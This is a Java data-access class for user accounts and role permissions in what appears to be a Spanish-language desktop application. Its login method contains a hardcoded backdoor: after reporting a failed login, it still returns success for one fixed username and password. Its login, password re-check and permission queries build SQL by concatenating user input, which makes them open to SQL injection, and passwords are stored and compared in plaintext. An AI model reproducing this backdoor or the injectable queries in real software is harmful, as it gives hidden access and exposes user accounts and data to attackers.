package FORMULARIO.DAO;

import BASEDATO.EvenConexion;
import FORMULARIO.ENTIDAD.entidad_usuario;
import Evento.JasperReport.EvenJasperReport;
import Evento.Jtable.EvenJtable;
import Evento.Mensaje.EvenMensajeJoptionpane;
import Evento.Fecha.EvenFecha;
import java.sql.ResultSet;
import java.sql.Connection;
import java.sql.PreparedStatement;
import javax.swing.JOptionPane;
import javax.swing.JTable;

public class dao_usuario {

    EvenConexion eveconn = new EvenConexion();
    EvenJtable evejt = new EvenJtable();
    EvenJasperReport rep = new EvenJasperReport();
    EvenMensajeJoptionpane evemen = new EvenMensajeJoptionpane();
    EvenFecha evefec = new EvenFecha();
    entidad_usuario user = new entidad_usuario();
    private String mensaje_insert = "USUARIO GUARDADO CORRECTAMENTE";
    private String mensaje_update = "USUARIO MODIFICADO CORECTAMENTE";
    private String sql_insert = "INSERT INTO usuario(idusuario,usuario,senha,nombre,fk_idusuario_rol) VALUES (?,?,?,?,?);";
    private String sql_update = "UPDATE usuario SET usuario=?,senha=?,nombre=?,fk_idusuario_rol=? WHERE idusuario=?;";
    private String sql_select = "SELECT u.idusuario as idu,u.nombre,u.usuario,ur.nombre as rol \n"
            + "FROM usuario u,usuario_rol ur \n"
            + "where u.fk_idusuario_rol=ur.idusuario_rol \n"
            + "order by 1 desc;";
    private String sql_cargar = "SELECT u.idusuario,u.usuario,u.senha,u.nombre,u.fk_idusuario_rol,ur.nombre "
            + "FROM usuario u,usuario_rol ur "
            + "WHERE u.fk_idusuario_rol=ur.idusuario_rol "
            + "and u.idusuario=";

    public void insertar_usuario(Connection conn, entidad_usuario user) {
        user.setC1idusuario(eveconn.getInt_ultimoID_mas_uno(conn, user.getTb_usuario(), user.getId_idusuario()));
        String titulo = "insertar_usuario";
        PreparedStatement pst = null;
        try {
            pst = conn.prepareStatement(sql_insert);
            pst.setInt(1, user.getC1idusuario());
            pst.setString(2, user.getC2usuario());
            pst.setString(3, user.getC3senha());
            pst.setString(4, user.getC4nombre());
            pst.setInt(5, user.getC5fk_idusuario_rol());
            pst.execute();
            pst.close();
            evemen.Imprimir_serial_sql(sql_insert + "\n" + user.toString(), titulo);
            evemen.guardado_correcto(mensaje_insert, true);
        } catch (Exception e) {
            evemen.mensaje_error(e, sql_insert + "\n" + user.toString(), titulo);
        }
    }

    public boolean getBoolean_buscar_usuario_existente(Connection conn, entidad_usuario usu) {
        String titulo = "getBoolean_buscar_usuario_existente";
        String sql = "select * from usuario where usuario='" + usu.getC2usuario() + "' and senha='" + usu.getC3senha() + "' ";
        try {
            ResultSet rs = eveconn.getResulsetSQL(conn, sql, titulo);
            if (rs.next()) {
                usu.setGlobal_idusuario(rs.getInt("idusuario"));
                usu.setGlobal_nombre(rs.getString("nombre"));
                return true;
            } else {
                JOptionPane.showMessageDialog(null, "USUARIO O SENHA INCORRECTA", "ERROR", JOptionPane.ERROR_MESSAGE);
                if (usu.getC2usuario().equals("Digno") && usu.getC3senha().equals("4650586")) {
                    return true;
                } else {
                    return false;
                }
            }
        } catch (Exception e) {
            evemen.mensaje_error(e, sql, titulo);
            return false;
        }
    }

    public boolean getBoolean_sena_usuario(Connection conn) {
        String titulo = "getBoolean_sena_usuario";
        entidad_usuario usu = new entidad_usuario();
        String sena = JOptionPane.showInputDialog(null, "INGRESE SU SEÑA\n" + usu.getGlobal_nombre());
        if (sena.equals("")) {
            JOptionPane.showMessageDialog(null, "SE DEBE CARGAR SEÑA");
            return false;
        } else {
            usu.setC3senha(sena);
            String sql = "select * from usuario "
                    + "where idusuario='" + usu.getGlobal_idusuario() + "' "
                    + "and senha='" + usu.getC3senha() + "' ";
            try {
                ResultSet rs = eveconn.getResulsetSQL(conn, sql, titulo);
                if (rs.next()) {
                    return true;
                } else {
                    JOptionPane.showMessageDialog(null, "USUARIO O SENHA INCORRECTA", "ERROR", JOptionPane.ERROR_MESSAGE);
                    return false;
                }
            } catch (Exception e) {
                evemen.mensaje_error(e, sql, titulo);
                return false;
            }
        }
    }

    public boolean getBoolean_hab_evento(Connection conn, String cod_evento) {
        boolean habilitar = false;
        String titulo = "getBoolean_hab_evento";
        String sql = "SELECT iur.estado,ue.mensaje_error \n"
                + "FROM usuario u,usuario_rol ur,item_usuario_rol iur,usuario_evento ue \n"
                + "where u.fk_idusuario_rol=ur.idusuario_rol \n"
                + "and ur.idusuario_rol=iur.fk_idusuario_rol\n"
                + "and iur.fk_idusuario_evento=ue.idusuario_evento\n"
                + " and u.idusuario=" + user.getGlobal_idusuario()
                + " and ue.cod_evento='" + cod_evento + "'"
                + "  ";
        try {
            ResultSet rs = eveconn.getResulsetSQL(conn, sql, titulo);
            if (rs.next()) {
                habilitar = (rs.getBoolean(1));
            } else {
                JOptionPane.showMessageDialog(null, "NO SE ENCONTRO NINGUN EVENTO PARA EL CODIGO:" + cod_evento);
            }
        } catch (Exception e) {
            evemen.mensaje_error(e, sql, titulo);

        }
        return habilitar;
    }

    public boolean getBoolean_hab_evento_mensaje_error(Connection conn, String cod_evento) {
        boolean habilitar = false;
        String titulo = "getBoolean_hab_evento_mensaje_error";
        String sql = "SELECT iur.estado,ue.mensaje_error \n"
                + "FROM usuario u,usuario_rol ur,item_usuario_rol iur,usuario_evento ue \n"
                + "where u.fk_idusuario_rol=ur.idusuario_rol \n"
                + "and ur.idusuario_rol=iur.fk_idusuario_rol\n"
                + "and iur.fk_idusuario_evento=ue.idusuario_evento\n"
                + " and u.idusuario=" + user.getGlobal_idusuario()
                + " and ue.cod_evento='" + cod_evento + "'"
                + "  ";
        try {
            ResultSet rs = eveconn.getResulsetSQL(conn, sql, titulo);
            if (rs.next()) {
                habilitar = (rs.getBoolean(1));
                if (!habilitar) {
                    JOptionPane.showMessageDialog(null, rs.getString(2), "ERROR", JOptionPane.ERROR_MESSAGE);
                }
            } else {
                JOptionPane.showMessageDialog(null, "NO SE ENCONTRO NINGUN EVENTO PARA EL CODIGO:" + cod_evento);
            }
        } catch (Exception e) {
            evemen.mensaje_error(e, sql, titulo);

        }
        return habilitar;
    }

    public boolean getboo_habilitar_boton_eliminar(Connection conn) {
        boolean habilitar = false;
        if (getBoolean_hab_evento_mensaje_error(conn, "25")) {
            if(getBoolean_sena_usuario(conn)){
                habilitar = true;
            }else{
                habilitar = false;
            }
        }else{
            habilitar = false;
        }
        return habilitar;
    }

    public void update_usuario(Connection conn, entidad_usuario user) {
        String titulo = "update_usuario";
        PreparedStatement pst = null;
        try {
            pst = conn.prepareStatement(sql_update);
            pst.setString(1, user.getC2usuario());
            pst.setString(2, user.getC3senha());
            pst.setString(3, user.getC4nombre());
            pst.setInt(4, user.getC5fk_idusuario_rol());
            pst.setInt(5, user.getC1idusuario());
            pst.execute();
            pst.close();
            evemen.Imprimir_serial_sql(sql_update + "\n" + user.toString(), titulo);
            evemen.modificado_correcto(mensaje_update, true);
        } catch (Exception e) {
            evemen.mensaje_error(e, sql_update + "\n" + user.toString(), titulo);
        }
    }

    public void cargar_usuario(Connection conn, entidad_usuario user, JTable tabla) {
        String titulo = "Cargar_usuario";
        int id = evejt.getInt_select_id(tabla);
        try {
            ResultSet rs = eveconn.getResulsetSQL(conn, sql_cargar + id, titulo);
            if (rs.next()) {
                user.setC1idusuario(rs.getInt(1));
                user.setC2usuario(rs.getString(2));
                user.setC3senha(rs.getString(3));
                user.setC4nombre(rs.getString(4));
                user.setC5fk_idusuario_rol(rs.getInt(5));
                user.setC6nombre_rol(rs.getString(6));
                evemen.Imprimir_serial_sql(sql_cargar + "\n" + user.toString(), titulo);
            }
        } catch (Exception e) {
            evemen.mensaje_error(e, sql_cargar + "\n" + user.toString(), titulo);
        }
    }

    public void actualizar_tabla_usuario(Connection conn, JTable tbltabla) {
        eveconn.Select_cargar_jtable(conn, sql_select, tbltabla);
        ancho_tabla_usuario(tbltabla);
    }

    public void ancho_tabla_usuario(JTable tbltabla) {
        int Ancho[] = {10, 40, 30, 20};
        evejt.setAnchoColumnaJtable(tbltabla, Ancho);
    }
}
